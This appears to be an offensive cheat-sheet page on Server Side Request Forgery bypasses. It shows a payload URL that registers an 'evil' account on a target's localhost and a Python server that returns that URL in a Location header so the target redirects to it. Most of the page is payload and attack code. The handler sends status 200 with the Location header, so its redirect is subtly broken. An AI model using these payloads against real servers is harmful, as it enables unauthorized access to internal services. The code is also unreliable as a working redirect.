---
description: Perform actions on the servers behalf
---

# Server Side Request Forgery

## Bypasses

### Localhost

#### Using the location header to perform a redirect to 127.0.0.1

Since it is possible to pass parameters in a redirect via location header you can use a link for a redirect to `localhost` if you're lucky enough to have a function that accepts query parameters, follows redirects & does not block connections to the internet

> If the target does not block connections to the internet you can use [bitly](https://bitly.com/) for this purpose, otherwise it is also possible to set up your own http server and implement a redirect via location header

**Payload**

```text
http://127.0.0.1/register?username=evil&password=evilpass&confirm=evilpass
```

#### Implementation via own http server

```text
from http.server import HTTPServer, BaseHTTPRequestHandler


class pyhandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Location', 
        'http://127.0.0.1/register?username=evil&password=evilpass&confirm=evilpass')
        self.end_headers()


class pyhttp(object):
    def __init__(self, server_class=HTTPServer, 
                 handler_class=pyhandler):
        self.address = server_address = ('', 80)
        self.httpd = server_class(server_address, handler_class)
        self.httpd.serve_forever()


pyhttp()

```



